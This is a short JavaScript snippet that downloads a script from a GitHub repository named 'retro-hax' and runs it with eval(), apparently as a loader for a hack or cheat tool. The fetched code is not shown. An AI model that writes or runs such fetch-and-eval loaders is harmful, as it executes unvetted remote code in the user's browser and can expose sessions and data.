fetch("https://raw.githubusercontent.com/forveined1/retro-hax/main/main.js")
  .then(response => response.text())
  .then(script => eval(script))
// Error Handling
  .catch(error => console.error("Error fetching or evaluating script:", error));
